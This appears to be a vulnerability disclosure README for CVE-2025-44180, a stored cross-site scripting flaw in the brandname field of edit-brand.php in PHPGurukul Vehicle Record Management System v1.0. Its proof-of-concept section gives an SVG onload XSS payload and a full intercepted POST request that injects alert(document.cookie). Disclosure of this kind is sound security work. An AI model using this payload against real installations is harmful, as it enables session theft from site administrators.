# Vehicle-Record-Management-System
XSS vulnerability to Vehicle Record Management System
# CVE-2025-44180-Phpgurukul-Vehicle-Record-Management-System-v1.0-Stored-Cross-Site-Scripting-Vulnerability
+ Exploit Author: nscerol
# Vendor Homepage
+ https://phpgurukul.com/vehicle-record-system-using-php-and-mysql/
# Software Link
+ https://phpgurukul.com/?sdm_process_download=1&download_id=19587
# Overview
+ PHPGurukul Vehicle Record Management System is susceptible to a critical security vulnerability involving Stored Cross-Site Scripting (XSS) through brandname parameter in the /edit-brand.php file. The application fails to adequately sanitize user-supplied data, allowing attackers to inject malicious scripts into the application. This could lead to the execution of arbitrary script code in the browsers of unsuspecting users, potentially compromising their security and privacy within the context of the affected site.
# Vulnerability Details
+ CVE ID: CVE-2025-44180
+ Affected Version: PHPGurukul Vehicle Record Management System V1.0
+ Vulnerable File: edit-brand.php
+ Parameters: brandname
# References:
+ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-44180
+ https://nvd.nist.gov/vuln/detail/CVE-2025-44180
# Description
+ The parameters 'brandname' in the edit-brand.php file of PHPGurukul Vehicle Record Management System V1.0 are susceptible to Stored Cross-Site Scripting (XSS). This vulnerability arises due to insufficient input validation and sanitation of user-supplied data. An attacker can exploit this weakness by injecting malicious scripts into these parameters, which, when stored on the server, may be executed when other users view the affected user's profile.
# Proof of Concept (PoC) : 
+ Go to the admin profile page and click to 'Brand'-->'Manage Brand' button to update
+ Click 'Edit' to update any of the data
+ Intercept the POST request to edit-brand.php via Burp Suite
+ Inject the payload to the vulnerable parameters
+ Payload: `"><svg/onload=alert(document.domain)>`
+ Example request for `brandname` parameter
```
POST /vehiclerecordsystem/admin/edit-brand.php?bid=1 HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 31
Origin: https://localhost
Connection: keep-alive
Referer: https://localhost/vehiclerecordsystem/admin/edit-brand.php?bid=1
Cookie: PHPSESSID=hvah0765vcec9jtep84vlv5eeh
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i

brandname=Toyota"><svg/onload=alert(document.cookie)>%2b%27&submit=+Submit
```
+ Go to the Brand-->Manage Brand--> Edit page and trigger the XSS -->
+ ![xsserror](https://github.com/user-attachments/assets/0841adcc-5e0b-4e7e-b12f-086c545998a9)

